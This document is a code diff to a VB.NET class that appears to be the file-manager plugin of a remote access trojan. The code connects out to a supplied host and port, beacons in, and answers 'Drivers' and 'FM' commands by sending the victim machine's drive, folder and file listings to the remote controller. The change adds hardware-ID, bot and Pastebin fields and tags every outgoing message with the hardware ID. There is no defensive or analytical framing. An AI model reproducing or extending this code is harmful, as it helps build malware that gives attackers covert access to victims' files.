@@ -5,7 +5,7 @@ Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         KEY = K
         HOST = H
@@ -13,6 +13,9 @@ Public Class Main
         SPL = SP
         PASS = PW
         FULLPATH = FP
+        HWID = HW
+        BOT = BT
+        Pastebin = PB
 
         Dim lp As Integer = 0
 
@@ -38,7 +41,7 @@ Public Class Main
             lp = 0
             C.Client.Connect(H, P)
             CN = True
-            Send("OFM")
+            Send("OFM" + SPL + HWID)
         Catch ex As Exception
             GoTo cc
         End Try
@@ -104,12 +107,12 @@ cc:
         Try
             Select Case A(0)
                 Case "Drivers"
-                    Send("FM" & SPL & FMDrives())
+                    Send("FM" & SPL & HWID & SPL & FMDrives())
                 Case "FM"
                     Try
-                        Send("FM" & SPL & FMFolders(A(1)) & FMFiles(A(1)))
+                        Send("FM" & SPL & HWID & SPL & FMFolders(A(1)) & FMFiles(A(1)))
                     Catch ex1 As Exception
-                        Send("FM" & SPL & "Error " + SPL + ex1.Message)
+                        Send("FM" & SPL & HWID & SPL & "Error " + SPL + ex1.Message)
                     End Try
                 Case "Close"
                     CloseMe()
@@ -237,5 +240,8 @@ cc:
     Public Shared PASS As String
     Public Shared M As New IO.MemoryStream
     Public Shared FULLPATH As String
+    Public Shared HWID As String
+    Public Shared BOT As String
+    Public Shared Pastebin As String
 
 End Class
